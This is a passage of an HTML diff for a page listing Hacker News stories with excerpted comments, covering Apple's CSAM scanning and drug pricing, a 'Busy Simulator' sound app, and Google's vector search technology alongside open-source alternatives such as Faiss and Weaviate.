+								<p class="story__comment_others">"This case reminds me a bit of the big stink with the Daraprim price hikes and Martin Shkreli being dumb enough to be the public face of it. That worked out pretty bad for him but also bad for everyone else, because now we had a guy to blame for it, instead of asking the harder questions like &#34;why aren&#39;t drug prices regulated?&#34; Utilities must go to the public utility commission to raise rates so why is the same not done for drugs? The federal government stockpiles oil in case of shortages, why is it not responsible for ensuring that drug production is continued?The maddening thing about the Apple CSAM scanning controversy is that I still have no idea which legislation Apple is complying with, and it&#39;s difficult to find out any reporting on that aspect. US? UK? EU? Clearly there is/are some government organization(s) with teeth long enough that Apple is not willing to go to court again as was the case with the San Bernandino shooter. Point is, whether or not Apple has been dishonest about this whole thing, they are still just a distraction."</p>
+							
+						
+							
+								<p class="story__comment_others">"So far all the comments are predictably negative and imply that Apple will at some time in the future attempt to covertly implement the feature in secret.Another take would be that they took on-board the extensive public criticism, and changed their minds."</p>
+							
+						
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<div class="story story_small-padding-bottom">
+			
+			<div >
+				<div class="story__title">
+					<h3><a href="https://busysimulator.com/">Busy Simulator: Feign importance with repeating app sounds</a></h3>
+				</div>
+				<div class="story__comments">
+					<div class="story__comment">
+						<a href="https://news.ycombinator.com/item?id=29561296">
+						
+							
+								<p class="story__comment_first line-clamp">"*Turns everything to maximum and sits listening to the result for a few moments*So this is what a career-ending catastrophic production failure sounds like.I feel I should be responding to this like a horror movie with clowns in it."</p>
+							
+						
+							
+								<p class="story__comment_others">"Oh man I feel like I have PTSD from procrastinating on projects for so many years. Heart rate is up, and I feel like drinking in excess."</p>
+							
+						
+							
+								<p class="story__comment_others">"Thanks for posting, I made this. Let me know if I&#39;m missing any of your (least) favorite sounds."</p>
+							
+						
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<div class="story story_small-padding-bottom">
+			
+			<div >
+				<div class="story__title">
+					<h3><a href="https://cloud.google.com/blog/topics/developers-practitioners/find-anything-blazingly-fast-googles-vector-search-technology">Find anything fast with Google&#39;s vector search technology</a></h3>
+				</div>
+				<div class="story__comments">
+					<div class="story__comment">
+						<a href="https://news.ycombinator.com/item?id=29554986">
+						
+							
+								<p class="story__comment_first line-clamp">"I built multiple systems using vector search, one of them demoed in a search engine for non-commercial content at http://teclis.comRunning vector search (also sometimes referred to as semantic search, or a part of semantic search stack) is a trivial matter with open-source libraries like Faiss https://github.com/facebookresearch/faissIt takes 5 minutes to set up. You can search billion vectors on common hardware. For low-latency (up to couple of hundred milliseconds) use cases, it is highly unlikely that any cloud solution like this would be a better choice than something deployed on premise because of the network overhead.(worth noting is that there are about two dozen vector search libraries, all benchmarked at http://ann-benchmarks.com/ and most of them open-source)A much more interesting (and harder) problem is creating good vectors to begin with. This refers to the process of converting a text or an image to a multidimensional vector, usually done by a machine learning model such as BERT (for text) or ImageNet (for images).Try entering a query like &#39;gpt3&#39; or &#39;2019&#39; into the news search demo linked in the Google&#39;s PR:https://matchit.magellanic-clouds.com/The results are nonsensical. Not because the vector search didn&#39;t do its job well, but because generated vectors were suboptimal to begin with. Having good vectors is 99% of the semantic search problem.A nice demo of what semantic search can do is Google&#39;s Talk to Books https://books.google.com/talktobooks/This area of research s fascinating. For those who want to play with this more, an interesting end-to-end (including both vector generation and search) open-source solution is Haystack https://github.com/deepset-ai/haystack"</p>
+							
+						
+							
+								<p class="story__comment_others">"People say google search is terrible these days, but I find the opposite.I can vaguely describe in a sentence the gist of an article I&#39;ve read, or an image, and the proper result will usually be in the first page.Of course, it doesn&#39;t always work, sometimes there are &#34;hash collisions&#34; so to speak, but I don&#39;t think the old algorithm would have been more successfully either, since if I knew the exact keywords to use, I wouldn&#39;t need to start with a vague description in the first place."</p>
+							
+						
+							
+								<p class="story__comment_others">"Interesting – we are working on an open source vector search engine called Weaviate and did the same for the complete Wikipedia and Wikidata.[1] Docs: https://www.semi.technology/developers/weaviate/current/[2] Github: https://github.com/semi-technologies/weaviate[3] Wikipedia demo dataset: https://github.com/semi-technologies/semantic-search-through...[4] Wikidata dataset: https://github.com/semi-technologies/biggraph-wikidata-searc...Last week there was also a feature on Techcrunch about vector search and Weaviate: https://techcrunch.com/2021/12/11/2246180/"</p>
 							
 						
 						</a>
